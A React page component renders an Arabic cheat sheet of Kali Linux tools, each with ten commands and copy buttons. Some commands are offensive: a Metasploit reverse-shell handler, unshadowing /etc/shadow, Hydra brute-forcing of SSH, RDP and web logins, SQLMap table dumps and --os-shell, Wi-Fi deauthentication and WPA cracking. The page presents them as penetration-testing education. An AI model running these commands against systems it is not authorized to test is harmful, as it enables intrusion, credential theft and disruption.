import Navbar from "@/components/Navbar";
import Footer from "@/components/Footer";
import { Terminal, ChevronDown, ChevronUp, Copy, Check } from "lucide-react";
import { useState } from "react";

interface Command {
  command: string;
  description: string;
}

interface Tool {
  name: string;
  description: string;
  commands: Command[];
}

const tools: Tool[] = [
  {
    name: "Nmap",
    description: "أداة فحص الشبكات واكتشاف المنافذ المفتوحة",
    commands: [
      { command: "nmap -sP 192.168.1.0/24", description: "فحص جميع الأجهزة في الشبكة (Ping Scan)" },
      { command: "nmap -sS 192.168.1.1", description: "فحص سريع للمنافذ (SYN Scan) - الأكثر استخداماً" },
      { command: "nmap -sV 192.168.1.1", description: "اكتشاف إصدارات الخدمات على المنافذ" },
      { command: "nmap -O 192.168.1.1", description: "اكتشاف نظام التشغيل" },
      { command: "nmap -A 192.168.1.1", description: "فحص شامل (نظام التشغيل + الخدمات + السكربتات)" },
      { command: "nmap -p 1-65535 192.168.1.1", description: "فحص جميع المنافذ (65535 منفذ)" },
      { command: "nmap -sU 192.168.1.1", description: "فحص منافذ UDP" },
      { command: "nmap --script vuln 192.168.1.1", description: "فحص الثغرات باستخدام السكربتات" },
      { command: "nmap -sN 192.168.1.1", description: "فحص خفي (Null Scan) لتجاوز الجدار الناري" },
      { command: "nmap -oN scan.txt 192.168.1.1", description: "حفظ النتائج في ملف نصي" },
    ],
  },
  {
    name: "Metasploit",
    description: "إطار عمل لاختبار الاختراق وتنفيذ الثغرات",
    commands: [
      { command: "msfconsole", description: "تشغيل واجهة Metasploit" },
      { command: "search exploit/windows", description: "البحث عن ثغرات ويندوز" },
      { command: "use exploit/multi/handler", description: "استخدام مستقبل الاتصالات" },
      { command: "set PAYLOAD windows/meterpreter/reverse_tcp", description: "تعيين Payload للاتصال العكسي" },
      { command: "set LHOST 192.168.1.100", description: "تعيين عنوان IP للمهاجم" },
      { command: "set LPORT 4444", description: "تعيين المنفذ للاستماع" },
      { command: "exploit", description: "تنفيذ الاستغلال" },
      { command: "sessions -l", description: "عرض الجلسات النشطة" },
      { command: "sessions -i 1", description: "الدخول للجلسة رقم 1" },
      { command: "db_nmap -sV 192.168.1.1", description: "فحص Nmap وحفظ النتائج في قاعدة البيانات" },
    ],
  },
  {
    name: "Burp Suite",
    description: "أداة لفحص تطبيقات الويب واكتشاف الثغرات",
    commands: [
      { command: "Proxy → Intercept → On", description: "تفعيل اعتراض الطلبات" },
      { command: "Target → Site map", description: "عرض خريطة الموقع المستهدف" },
      { command: "Intruder → Positions", description: "تحديد نقاط الحقن للهجمات" },
      { command: "Repeater → Send", description: "إعادة إرسال الطلبات مع تعديلات" },
      { command: "Scanner → Active scan", description: "فحص تلقائي للثغرات" },
      { command: "Decoder → Encode/Decode", description: "تشفير وفك تشفير النصوص" },
      { command: "Comparer → Compare", description: "مقارنة استجابتين" },
      { command: "Extender → BApp Store", description: "تثبيت إضافات من المتجر" },
      { command: "Options → Upstream Proxy", description: "إعداد بروكسي إضافي" },
      { command: "Logger → View logs", description: "عرض سجل جميع الطلبات" },
    ],
  },
  {
    name: "Wireshark",
    description: "أداة تحليل حزم الشبكة",
    commands: [
      { command: "ip.addr == 192.168.1.1", description: "فلترة حسب عنوان IP" },
      { command: "tcp.port == 80", description: "فلترة حسب منفذ TCP" },
      { command: "http", description: "عرض حركة HTTP فقط" },
      { command: "dns", description: "عرض طلبات DNS فقط" },
      { command: "tcp.flags.syn == 1", description: "عرض حزم SYN (بداية الاتصال)" },
      { command: "frame contains \"password\"", description: "البحث عن كلمة في الحزم" },
      { command: "ip.src == 192.168.1.1", description: "فلترة حسب المصدر" },
      { command: "ip.dst == 192.168.1.1", description: "فلترة حسب الوجهة" },
      { command: "Follow TCP Stream", description: "تتبع محادثة TCP كاملة" },
      { command: "Statistics → Protocol Hierarchy", description: "إحصائيات البروتوكولات" },
    ],
  },
  {
    name: "John the Ripper",
    description: "أداة لكسر كلمات المرور",
    commands: [
      { command: "john --wordlist=rockyou.txt hash.txt", description: "كسر الهاش باستخدام قائمة كلمات" },
      { command: "john --format=raw-md5 hash.txt", description: "تحديد نوع الهاش (MD5)" },
      { command: "john --show hash.txt", description: "عرض كلمات المرور المكسورة" },
      { command: "john --incremental hash.txt", description: "هجوم تزايدي (كل الاحتمالات)" },
      { command: "john --rules hash.txt", description: "استخدام قواعد التعديل" },
      { command: "unshadow /etc/passwd /etc/shadow > hash.txt", description: "دمج ملفات لينكس للكسر" },
      { command: "john --format=NT hash.txt", description: "كسر هاش ويندوز NTLM" },
      { command: "john --fork=4 hash.txt", description: "استخدام 4 أنوية للسرعة" },
      { command: "john --restore", description: "استكمال جلسة سابقة" },
      { command: "john --list=formats", description: "عرض أنواع الهاش المدعومة" },
    ],
  },
  {
    name: "Hydra",
    description: "أداة لهجمات القوة الغاشمة",
    commands: [
      { command: "hydra -l admin -P pass.txt 192.168.1.1 ssh", description: "هجوم SSH بمستخدم واحد" },
      { command: "hydra -L users.txt -P pass.txt 192.168.1.1 ftp", description: "هجوم FTP بقوائم" },
      { command: "hydra -l admin -P pass.txt 192.168.1.1 http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"", description: "هجوم نموذج ويب" },
      { command: "hydra -l admin -P pass.txt rdp://192.168.1.1", description: "هجوم Remote Desktop" },
      { command: "hydra -l admin -P pass.txt mysql://192.168.1.1", description: "هجوم قاعدة بيانات MySQL" },
      { command: "hydra -t 4 -l admin -P pass.txt ssh://192.168.1.1", description: "تحديد 4 محاولات متزامنة" },
      { command: "hydra -V -l admin -P pass.txt 192.168.1.1 ssh", description: "وضع مفصل (Verbose)" },
      { command: "hydra -e nsr -l admin -P pass.txt 192.168.1.1 ssh", description: "تجربة كلمات مرور فارغة وعكسية" },
      { command: "hydra -o results.txt -l admin -P pass.txt 192.168.1.1 ssh", description: "حفظ النتائج في ملف" },
      { command: "hydra -x 6:8:aA1 192.168.1.1 ssh -l admin", description: "توليد كلمات مرور (6-8 أحرف)" },
    ],
  },
  {
    name: "SQLMap",
    description: "أداة آلية لاكتشاف واستغلال ثغرات SQL Injection",
    commands: [
      { command: "sqlmap -u \"http://site.com/page?id=1\"", description: "فحص رابط للثغرات" },
      { command: "sqlmap -u \"URL\" --dbs", description: "استخراج أسماء قواعد البيانات" },
      { command: "sqlmap -u \"URL\" -D dbname --tables", description: "استخراج أسماء الجداول" },
      { command: "sqlmap -u \"URL\" -D dbname -T users --dump", description: "استخراج بيانات الجدول" },
      { command: "sqlmap -u \"URL\" --current-user", description: "معرفة المستخدم الحالي" },
      { command: "sqlmap -u \"URL\" --is-dba", description: "التحقق من صلاحيات المدير" },
      { command: "sqlmap -u \"URL\" --os-shell", description: "الحصول على shell على السيرفر" },
      { command: "sqlmap -r request.txt", description: "فحص من ملف طلب HTTP" },
      { command: "sqlmap -u \"URL\" --level=5 --risk=3", description: "فحص عميق وشامل" },
      { command: "sqlmap -u \"URL\" --tamper=space2comment", description: "تجاوز فلاتر الحماية" },
    ],
  },
  {
    name: "Aircrack-ng",
    description: "مجموعة أدوات لاختبار أمان شبكات Wi-Fi",
    commands: [
      { command: "airmon-ng start wlan0", description: "تفعيل وضع المراقبة" },
      { command: "airodump-ng wlan0mon", description: "مسح الشبكات القريبة" },
      { command: "airodump-ng -c 6 --bssid XX:XX:XX -w capture wlan0mon", description: "التقاط حزم شبكة محددة" },
      { command: "aireplay-ng -0 10 -a XX:XX:XX wlan0mon", description: "هجوم قطع الاتصال (Deauth)" },
      { command: "aircrack-ng -w wordlist.txt capture.cap", description: "كسر كلمة مرور WPA/WPA2" },
      { command: "aireplay-ng -1 0 -a XX:XX:XX wlan0mon", description: "هجوم المصادقة المزيفة" },
      { command: "aireplay-ng -3 -b XX:XX:XX wlan0mon", description: "هجوم إعادة الحقن ARP" },
      { command: "airmon-ng check kill", description: "إيقاف العمليات المتعارضة" },
      { command: "airmon-ng stop wlan0mon", description: "إيقاف وضع المراقبة" },
      { command: "aircrack-ng -J hashcat capture.cap", description: "تصدير لصيغة Hashcat" },
    ],
  },
  {
    name: "Nikto",
    description: "أداة فحص الثغرات في خوادم الويب",
    commands: [
      { command: "nikto -h http://192.168.1.1", description: "فحص أساسي للموقع" },
      { command: "nikto -h http://192.168.1.1 -p 8080", description: "فحص منفذ محدد" },
      { command: "nikto -h http://192.168.1.1 -ssl", description: "فحص موقع HTTPS" },
      { command: "nikto -h http://192.168.1.1 -o report.html -Format htm", description: "حفظ التقرير بصيغة HTML" },
      { command: "nikto -h http://192.168.1.1 -Tuning 9", description: "فحص ثغرات SQL Injection" },
      { command: "nikto -h http://192.168.1.1 -evasion 1", description: "تجاوز IDS بتشفير URL" },
      { command: "nikto -h http://192.168.1.1 -maxtime 60s", description: "تحديد وقت الفحص" },
      { command: "nikto -h http://192.168.1.1 -C all", description: "فحص جميع ملفات CGI" },
      { command: "nikto -h http://192.168.1.1 -Display V", description: "عرض تفاصيل الفحص" },
      { command: "nikto -update", description: "تحديث قاعدة بيانات الثغرات" },
    ],
  },
];

const ToolsPage = () => {
  const [expandedTool, setExpandedTool] = useState<number | null>(0);
  const [copiedCommand, setCopiedCommand] = useState<string | null>(null);

  const copyCommand = (command: string) => {
    navigator.clipboard.writeText(command);
    setCopiedCommand(command);
    setTimeout(() => setCopiedCommand(null), 2000);
  };

  return (
    <div className="min-h-screen bg-background">
      <Navbar />
      <main className="pt-24 pb-16">
        <div className="container mx-auto px-4">
          {/* Header */}
          <div className="text-center mb-16">
            <div className="flex justify-center mb-6">
              <div className="cyber-icon-box">
                <Terminal className="w-10 h-10 text-primary" />
              </div>
            </div>
            <h1 className="text-4xl md:text-5xl font-bold text-primary text-glow mb-4">
              أدوات كالي لينكس
            </h1>
            <p className="text-muted-foreground text-lg max-w-2xl mx-auto">
              {tools.length} أداة احترافية مع 10 أوامر لكل أداة وشرح تفصيلي بالعربي
            </p>
          </div>

          {/* Tools Accordion */}
          <div className="max-w-5xl mx-auto space-y-4">
            {tools.map((tool, index) => (
              <div key={index} className="cyber-card overflow-hidden">
                <button
                  onClick={() => setExpandedTool(expandedTool === index ? null : index)}
                  className="w-full p-6 flex items-center justify-between hover:bg-primary/5 transition-colors"
                >
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 rounded-xl bg-primary/10 border border-primary/30 flex items-center justify-center">
                      <Terminal className="w-6 h-6 text-primary" />
                    </div>
                    <div className="text-right">
                      <h3 className="text-xl font-bold text-primary">{tool.name}</h3>
                      <p className="text-muted-foreground text-sm">{tool.description}</p>
                    </div>
                  </div>
                  {expandedTool === index ? (
                    <ChevronUp className="w-6 h-6 text-primary" />
                  ) : (
                    <ChevronDown className="w-6 h-6 text-muted-foreground" />
                  )}
                </button>

                {expandedTool === index && (
                  <div className="border-t border-border/30 p-6 space-y-3 animate-fade-in">
                    {tool.commands.map((cmd, cmdIndex) => (
                      <div
                        key={cmdIndex}
                        className="flex items-start gap-4 p-4 rounded-xl bg-secondary/50 hover:bg-secondary/80 transition-colors group"
                      >
                        <span className="w-8 h-8 rounded-lg bg-primary/20 text-primary flex items-center justify-center font-bold text-sm flex-shrink-0">
                          {cmdIndex + 1}
                        </span>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-2 mb-2">
                            <code className="text-primary text-sm font-mono bg-background/50 px-3 py-1 rounded-lg break-all" dir="ltr">
                              {cmd.command}
                            </code>
                            <button
                              onClick={() => copyCommand(cmd.command)}
                              className="p-2 rounded-lg hover:bg-primary/20 transition-colors opacity-0 group-hover:opacity-100"
                            >
                              {copiedCommand === cmd.command ? (
                                <Check className="w-4 h-4 text-primary" />
                              ) : (
                                <Copy className="w-4 h-4 text-muted-foreground" />
                              )}
                            </button>
                          </div>
                          <p className="text-muted-foreground text-sm">{cmd.description}</p>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default ToolsPage;
